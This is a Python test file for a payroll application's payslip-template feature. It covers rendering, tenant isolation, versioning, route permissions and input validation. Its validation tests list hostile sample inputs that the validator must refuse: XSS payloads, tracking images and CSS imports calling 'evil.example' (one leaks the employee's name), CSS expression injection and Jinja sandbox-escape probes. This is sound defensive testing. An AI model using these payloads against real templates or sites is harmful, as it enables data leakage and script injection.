"""
tests/test_payslip_templates.py
-------------------------------
Organisation-owned payslip templates (f3a9c1d7e2b4):

  * starters validate and render; a template only changes presentation —
    its lines are exactly service.payslip_line_items (what the PDF prints);
  * tenant isolation on every read / write / render path;
  * unsafe markup, CSS and Jinja are refused; the sandbox caps loops;
  * the rendered document carries a script-blocking CSP and escapes data;
  * no assignment / unrepresentable / FAILED payslip -> the statutory payslip;
  * Draft -> Active -> Archived versioning, and freezing at run approval;
  * route gates: payroll operators only, writes need a writeable workspace.
"""
from datetime import date
from decimal import Decimal

import pytest
from fastapi import HTTPException

from app.core.dependencies import get_current_payroll_operator, get_current_super_admin
from app.modules.organizations.models import Organization
from app.modules.payroll import payslip_template_service as tpl
from app.modules.payroll import service
from app.modules.payroll.models import (
    PayrollEmployee,
    PayrollRun,
    PayslipItem,
    PayslipTemplateAssignment,
)
from app.modules.payroll.router import payroll_router


# ── helpers ──────────────────────────────────────────────────────────────────

def _org(db, code):
    org = Organization(organization_name=f"Org {code}", organization_code=code)
    db.add(org)
    db.commit()
    db.refresh(org)
    return org


def _payslip(db, org, *, name="Asha Rao", country="IN", gross=None, status="Pending", run=None):
    emp = PayrollEmployee(organization_id=org.id, employee_code=f"E-{org.id}-{name[:3]}", name=name,
                          country_code=country, ctc=Decimal("960000"))
    db.add(emp)
    if run is None:
        run = PayrollRun(organization_id=org.id, run_code=f"RUN-{org.id}", period_label="June 2026",
                         pay_date=date(2026, 6, 30), period_start=date(2026, 6, 1),
                         period_end=date(2026, 6, 30), status="Draft")
        db.add(run)
    db.flush()
    item = PayslipItem(
        organization_id=org.id, payroll_run_id=run.id, employee_id=emp.id, employee_name=name,
        country_code=country, basic_salary=Decimal("50000"), hra=Decimal("20000"),
        special_allowance=Decimal("10000"), gross_pay=gross if gross is not None else Decimal("80000"),
        tds=Decimal("5000"), pf=Decimal("1800"), professional_tax=Decimal("200"),
        total_deductions=Decimal("7000"), net_pay=Decimal("73000"), status=status,
    )
    db.add(item)
    db.commit()
    db.refresh(item)
    return item, run


def _published(db, org, starter="CLASSIC_NAVY", country=None):
    t = tpl.create_template(db, org.id, None, {"starter": starter})
    tpl.publish_template(db, org.id, t["id"], None)
    tpl.assign_template(db, org.id, None, t["id"], country)
    return t["id"]


def _status(exc_info):
    return exc_info.value.status_code


# ── starters and rendering ───────────────────────────────────────────────────

@pytest.mark.parametrize("key", list(tpl.STARTERS))
def test_every_starter_passes_validation_and_previews(key):
    s = tpl.STARTERS[key]
    fragment, css, warnings = tpl.validate_template(s["html"], s["css"])
    assert warnings == []
    out = tpl.preview(s["html"], s["css"], s["configuration"], "IN")
    assert "Sample Employee" in out["renderedHtml"]
    assert "default-src 'none'" in out["renderedHtml"]


def test_rendered_payslip_shows_exactly_the_pdf_lines_and_totals(db):
    org = _org(db, "TPL_A")
    item, _run = _payslip(db, org)
    _published(db, org)
    out = tpl.render_payslip(db, org.id, item.id)
    html = out["renderedHtml"]

    data, _item, _r = service.get_payslip_by_id(db, item.id, org.id)
    earnings, deductions = service.payslip_line_items(dict(data), "IN")
    for label, _amount in earnings + deductions:
        assert label.replace("(", "").split()[0] in html
    assert "₹ 80,000.00" in html and "₹ 7,000.00" in html and "₹ 73,000.00" in html
    assert "Rupees Seventy Three Thousand Only" in html
    assert out["metadata"]["frozen"] is False


def test_employee_data_is_html_escaped(db):
    org = _org(db, "TPL_ESC")
    item, _run = _payslip(db, org, name="<img src=x onerror=alert(1)>")
    _published(db, org)
    html = tpl.render_payslip(db, org.id, item.id)["renderedHtml"]
    assert "<img src=x" not in html
    assert "&lt;img src=x onerror=alert(1)&gt;" in html


# ── fallbacks to the statutory payslip ───────────────────────────────────────

def test_no_assignment_means_statutory_payslip(db):
    org = _org(db, "TPL_NONE")
    item, _run = _payslip(db, org)
    with pytest.raises(HTTPException) as e:
        tpl.render_payslip(db, org.id, item.id)
    assert _status(e) == 404 and e.value.detail["code"] == "TEMPLATE_NOT_ASSIGNED"


def test_unreconciled_breakdown_is_never_rendered_through_a_template(db):
    org = _org(db, "TPL_REC")
    item, _run = _payslip(db, org, gross=Decimal("95000"))   # lines sum to 80,000
    _published(db, org)
    with pytest.raises(HTTPException) as e:
        tpl.render_payslip(db, org.id, item.id)
    assert _status(e) == 409 and e.value.detail["code"] == "TEMPLATE_NOT_REPRESENTABLE"


def test_failed_payslip_is_never_rendered_through_a_template(db):
    org = _org(db, "TPL_FAIL")
    item, _run = _payslip(db, org, status="Failed")
    _published(db, org)
    with pytest.raises(HTTPException) as e:
        tpl.render_payslip(db, org.id, item.id)
    assert _status(e) == 409


def test_country_assignment_beats_all_and_unassign_restores_statutory(db):
    org = _org(db, "TPL_SCOPE")
    item, _run = _payslip(db, org)
    navy = _published(db, org, "CLASSIC_NAVY", None)
    emerald = _published(db, org, "MODERN_EMERALD", "IN")
    assert tpl.render_payslip(db, org.id, item.id)["metadata"]["templateId"] == emerald
    tpl.unassign(db, org.id, "IN")
    assert tpl.render_payslip(db, org.id, item.id)["metadata"]["templateId"] == navy
    tpl.unassign(db, org.id, "ALL")
    with pytest.raises(HTTPException):
        tpl.render_payslip(db, org.id, item.id)


# ── tenant isolation ─────────────────────────────────────────────────────────

def test_another_organisation_cannot_read_change_use_or_render(db):
    org_a, org_b = _org(db, "TPL_TA"), _org(db, "TPL_TB")
    item_a, _run = _payslip(db, org_a)
    tid = _published(db, org_a)

    for call in (
        lambda: tpl.get_template_detail(db, org_b.id, tid),
        lambda: tpl.update_template(db, org_b.id, tid, None, {"name": "hijack"}),
        lambda: tpl.publish_template(db, org_b.id, tid, None),
        lambda: tpl.assign_template(db, org_b.id, None, tid, None),
        lambda: tpl.archive_template(db, org_b.id, tid),
        lambda: tpl.render_payslip(db, org_b.id, item_a.id),
    ):
        with pytest.raises(HTTPException) as e:
            call()
        assert _status(e) == 404
    assert tpl.list_templates(db, org_b.id)["templates"] == []
    assert tpl.get_template_detail(db, org_a.id, tid)["name"] != "hijack"


def test_a_payslip_frozen_to_another_orgs_version_is_ignored(db):
    org_a, org_b = _org(db, "TPL_FA"), _org(db, "TPL_FB")
    tid_a = _published(db, org_a)
    version_a = tpl.get_template_detail(db, org_a.id, tid_a)["activeVersion"]["id"]
    item_b, _run = _payslip(db, org_b)
    item_b.template_version_id = version_a
    db.commit()
    with pytest.raises(HTTPException) as e:
        tpl.render_payslip(db, org_b.id, item_b.id)
    assert _status(e) == 404


# ── validation ───────────────────────────────────────────────────────────────

_GOOD = "<p>{{ employee.name }} {{ totals.net_pay_formatted }}{% for l in earnings %}{% endfor %}" \
        "{% for l in deductions %}{% endfor %}</p>"


@pytest.mark.parametrize("html", [
    "<script>alert(1)</script>",
    "<SCRIPT >alert(1)</SCRIPT>",
    "<img src=\"data:image/png;base64,AA\" onerror=\"alert(1)\">",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<a href=\"&#106;avascript:alert(1)\">x</a>",
    "<img src=\"https://evil.example/p.gif?{{ employee.name }}\">",
    "<img src=\"//evil.example/p.gif\">",
    "<img src=\"{{ employee.name }}\">",
    "<iframe src=\"data:image/png;base64,AA\"></iframe>",
    "<svg><circle/></svg>",
    "<form action=\"#\"></form>",
    "<meta http-equiv=\"refresh\" content=\"0\">",
    "{{ employee.name | safe }}",
    "{% autoescape false %}{{ employee.name }}{% endautoescape %}",
    "{% include 'x.html' %}",
    "{% for x in %}",
])
def test_unsafe_or_broken_html_is_refused(html):
    with pytest.raises(HTTPException) as e:
        tpl.validate_template(html, "")
    assert _status(e) == 400


@pytest.mark.parametrize("css", [
    "@import url(https://evil.example/x.css);",
    "body { background: url(https://evil.example/p.gif); }",
    "body { background: url('//evil.example/p.gif'); }",
    "body { width: expression(alert(1)); }",
    "</style><script>alert(1)</script>",
])
def test_unsafe_css_is_refused(css):
    with pytest.raises(HTTPException) as e:
        tpl.validate_template(_GOOD, css)
    assert _status(e) == 400


def test_style_blocks_in_an_imported_document_move_to_css():
    doc = ("<!DOCTYPE html><html><head><title>x</title><style>.a{color:red}</style></head>"
           f"<body class='b'>{_GOOD}</body></html>")
    fragment, css, _w = tpl.validate_template(doc, "")
    assert fragment == _GOOD
    assert ".a{color:red}" in css


def test_sandbox_caps_loops_and_multiplication():
    for html in ("{% for i in range(1000000) %}x{% endfor %}", "{{ 'x' * 100000000 }}", "{{ 9 ** 999999 }}"):
        with pytest.raises(HTTPException) as e:
            tpl.preview(html, "", None, "IN")
        assert _status(e) == 400


def test_sandbox_blocks_python_internals():
    with pytest.raises(HTTPException):
        tpl.preview("{{ employee.__class__.__mro__ }}{{ ''.__class__.__subclasses__() }}", "", None, "IN")


def test_bad_colour_is_refused():
    with pytest.raises(HTTPException):
        tpl.normalize_config({"primaryColor": "red;} body{display:none"})


# ── versioning and freezing ──────────────────────────────────────────────────

def test_draft_active_archived_lifecycle_and_assignment_follows_publish(db):
    org = _org(db, "TPL_VER")
    tid = _published(db, org)
    d = tpl.get_template_detail(db, org.id, tid)
    assert d["activeVersion"]["versionNumber"] == 1 and not d["hasUnpublishedChanges"]

    d = tpl.update_template(db, org.id, tid, None, {"cssContent": "body{color:#111}"})
    assert d["latestVersion"]["versionNumber"] == 2 and d["latestVersion"]["status"] == "Draft"
    assert d["activeVersion"]["versionNumber"] == 1

    # Saving again edits the same draft.
    d = tpl.update_template(db, org.id, tid, None, {"cssContent": "body{color:#222}"})
    assert d["latestVersion"]["versionNumber"] == 2

    d = tpl.publish_template(db, org.id, tid, None)
    assert d["activeVersion"]["versionNumber"] == 2
    a = db.query(PayslipTemplateAssignment).filter_by(organization_id=org.id).one()
    assert a.version_id == d["activeVersion"]["id"]

    with pytest.raises(HTTPException) as e:
        tpl.publish_template(db, org.id, tid, None)
    assert _status(e) == 409


def test_unpublished_template_cannot_be_assigned(db):
    org = _org(db, "TPL_UNPUB")
    t = tpl.create_template(db, org.id, None, {"starter": "CLASSIC_NAVY"})
    with pytest.raises(HTTPException) as e:
        tpl.assign_template(db, org.id, None, t["id"], None)
    assert _status(e) == 409


def test_approval_freezes_the_version_an_issued_payslip_keeps(db):
    org = _org(db, "TPL_FRZ")
    item, run = _payslip(db, org)
    tid = _published(db, org)
    v1 = tpl.get_template_detail(db, org.id, tid)["activeVersion"]["id"]

    tpl.freeze_run_templates(db, run)
    db.commit()
    db.refresh(item)
    assert item.template_version_id == v1

    tpl.update_template(db, org.id, tid, None, {"cssContent": "body{color:#333}"})
    tpl.publish_template(db, org.id, tid, None)
    meta = tpl.render_payslip(db, org.id, item.id)["metadata"]
    assert meta["versionId"] == v1 and meta["frozen"] is True


def test_freezing_without_any_assignment_leaves_the_statutory_payslip(db):
    org = _org(db, "TPL_FRZ0")
    item, run = _payslip(db, org)
    tpl.freeze_run_templates(db, run)
    db.commit()
    db.refresh(item)
    assert item.template_version_id is None


def test_archive_removes_assignments(db):
    org = _org(db, "TPL_ARC")
    item, _run = _payslip(db, org)
    tid = _published(db, org)
    out = tpl.archive_template(db, org.id, tid)
    assert out["assignments"] == []
    with pytest.raises(HTTPException):
        tpl.render_payslip(db, org.id, item.id)
    with pytest.raises(HTTPException) as e:
        tpl.update_template(db, org.id, tid, None, {"name": "x"})
    assert _status(e) == 409


def test_codes_are_unique_per_organisation(db):
    org = _org(db, "TPL_CODE")
    a = tpl.create_template(db, org.id, None, {"starter": "CLASSIC_NAVY"})
    b = tpl.create_template(db, org.id, None, {"starter": "CLASSIC_NAVY"})
    assert a["code"] != b["code"]
    tpl.create_template(db, org.id, None, {"starter": "CLASSIC_NAVY", "code": "ACME-1"})
    with pytest.raises(HTTPException) as e:
        tpl.create_template(db, org.id, None, {"starter": "CLASSIC_NAVY", "code": "ACME-1"})
    assert _status(e) == 409


# ── route gates ──────────────────────────────────────────────────────────────

def _calls(dependant, seen=None):
    seen = seen if seen is not None else set()
    if id(dependant) in seen:
        return set()
    seen.add(id(dependant))
    out = {dependant.call} if dependant.call is not None else set()
    for sub in dependant.dependencies:
        out |= _calls(sub, seen)
    return out


def _route(path, method):
    matches = [r for r in payroll_router.routes
               if getattr(r, "path", None) == path and method in getattr(r, "methods", set())]
    assert len(matches) == 1, (method, path)
    return matches[0]


def test_template_routes_are_payroll_operator_only_and_writes_need_a_writeable_workspace():
    reads = [("/payroll/payslip-templates", "GET"), ("/payroll/payslip-templates/{template_id}", "GET"),
             ("/payroll/payslip-templates/preview", "POST")]
    writes = [("/payroll/payslip-templates", "POST"), ("/payroll/payslip-templates/import", "POST"),
              ("/payroll/payslip-templates/assignments", "POST"),
              ("/payroll/payslip-templates/assignments/{country}", "DELETE"),
              ("/payroll/payslip-templates/{template_id}", "PUT"),
              ("/payroll/payslip-templates/{template_id}/publish", "POST"),
              ("/payroll/payslip-templates/{template_id}", "DELETE")]
    for path, method in reads + writes:
        calls = _calls(_route(path, method).dependant)
        assert get_current_payroll_operator in calls, (method, path)
        assert get_current_super_admin not in calls, (method, path)
    for path, method in writes:
        names = {getattr(c, "__qualname__", "") for c in _calls(_route(path, method).dependant)}
        assert any("require_writeable_workspace" in n for n in names), (method, path)


def test_static_template_paths_are_declared_before_the_id_path():
    paths = [getattr(r, "path", "") for r in payroll_router.routes]
    by_id = paths.index("/payroll/payslip-templates/{template_id}")
    for static in ("/payroll/payslip-templates/preview", "/payroll/payslip-templates/import",
                   "/payroll/payslip-templates/assignments"):
        assert paths.index(static) < by_id


def test_rendered_payslip_route_matches_the_payslip_read_gate():
    calls = _calls(_route("/payroll/payslips/{payslip_id}/rendered", "GET").dependant)
    baseline = _calls(_route("/payroll/payslips/{payslip_id}", "GET").dependant)
    gate = lambda cs: {c for c in cs if getattr(c, "__name__", "").startswith("get_current")}  # noqa: E731
    assert gate(calls) == gate(baseline)


# ── migration ────────────────────────────────────────────────────────────────

def test_migration_downgrades_and_upgrades_cleanly_on_sqlite():
    import importlib.util
    from pathlib import Path
    from alembic.operations import Operations
    from alembic.runtime.migration import MigrationContext
    from sqlalchemy import create_engine, inspect
    from sqlalchemy.pool import StaticPool
    from app.database import Base
    import app.modules.organizations.models  # noqa: F401
    import app.modules.auth.models  # noqa: F401
    import app.modules.payroll.models  # noqa: F401

    path = Path(__file__).resolve().parents[1] / "alembic" / "versions" / "f3a9c1d7e2b4_payslip_templates.py"
    spec = importlib.util.spec_from_file_location("_mig_f3a9", path)
    mig = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mig)
    assert mig.down_revision == "e7ec6c1933b4"

    engine = create_engine("sqlite:///:memory:", poolclass=StaticPool)
    Base.metadata.create_all(engine)
    names = {"payroll_payslip_templates", "payroll_payslip_template_versions", "payroll_payslip_template_assignments"}

    def run(fn):
        with engine.begin() as conn:
            with Operations.context(MigrationContext.configure(conn)):
                fn()

    run(mig.downgrade)
    insp = inspect(engine)
    assert not names & set(insp.get_table_names())
    assert "template_version_id" not in {c["name"] for c in insp.get_columns("payslip_items")}
    run(mig.upgrade)
    run(mig.upgrade)   # idempotent
    insp = inspect(engine)
    assert names <= set(insp.get_table_names())
    assert "template_version_id" in {c["name"] for c in insp.get_columns("payslip_items")}
    engine.dispose()


# ── placeholder checks (N2) ──────────────────────────────────────────────────

@pytest.mark.parametrize("html, bad", [
    ("<p>{{ employee_name }}</p>", "employee_name"),
    ("<p>{{ employee.salary }}</p>", "employee.salary"),
    ("<p>{{ totals.net }}</p>", "totals.net"),
    ("{% for line in earnings %}{{ line.amt }}{% endfor %}", "line.amt"),
    ("{% for i in employee.identifiers %}{{ i.number }}{% endfor %}", "i.number"),
    ("<p>{{ net_pay }}</p>", "net_pay"),
])
def test_unknown_placeholders_are_refused_by_name(html, bad):
    with pytest.raises(HTTPException) as e:
        tpl.validate_template(html, "")
    assert _status(e) == 400 and bad in e.value.detail


def test_known_placeholders_loops_sets_and_string_methods_are_accepted():
    html = ("{% set title = 'Payslip' %}<h1>{{ title }} {{ company.name | upper }}</h1>"
            "<p>{{ employee.name.title() }} {{ payroll.period }} {{ currency.symbol }}</p>"
            "{% for line in earnings %}{{ loop.index }} {{ line.label }} {{ line.amount_formatted }}{% endfor %}"
            "{% for line in deductions %}{{ line.label }}{% endfor %}{{ earnings[0].label }}"
            "{% for i in employee.identifiers %}{{ i.label }}: {{ i.value }}{% endfor %}"
            "{% if config.showNetInWords %}{{ totals.net_pay_in_words }}{% endif %}"
            "<b>{{ totals.net_pay_formatted }}</b>{{ disclaimer }}{{ generated_on }}")
    fragment, _css, warnings = tpl.validate_template(html, "")
    assert warnings == []
    tpl.preview(html, "", None, "IN")


def test_a_static_template_saves_with_warnings_but_cannot_be_published(db):
    org = _org(db, "TPL_STATIC")
    static = "<h1>Payslip</h1><p>John Doe</p><p>Net pay: 50,000</p>"
    t = tpl.create_template(db, org.id, None, {"name": "Static", "htmlContent": static, "cssContent": ""})
    assert len(t["warnings"]) == 4
    with pytest.raises(HTTPException) as e:
        tpl.publish_template(db, org.id, t["id"], None)
    assert _status(e) == 409
    for what in ("the employee's name", "net pay", "the earnings lines", "the deduction lines"):
        assert what in e.value.detail
    # Once the data placeholders are added, it publishes.
    tpl.update_template(db, org.id, t["id"], None, {"htmlContent": _GOOD + "{{ totals.net_pay_formatted }}"})
    assert tpl.publish_template(db, org.id, t["id"], None)["activeVersion"]["versionNumber"] == 1


@pytest.mark.parametrize("html", [
    "<div style=\"background:url(https://evil.example/p.gif)\">x</div>",
    "<div style='background-image: url(//evil.example/p.gif)'>x</div>",
    "<div style=\"width: expression(alert(1))\">x</div>",
])
def test_external_urls_in_style_attributes_are_refused(html):
    with pytest.raises(HTTPException) as e:
        tpl.validate_template(html + _GOOD, "")
    assert _status(e) == 400


def test_data_uri_in_style_attribute_is_allowed():
    tpl.validate_template("<div style=\"background:url(data:image/png;base64,AA)\">x</div>" + _GOOD, "")
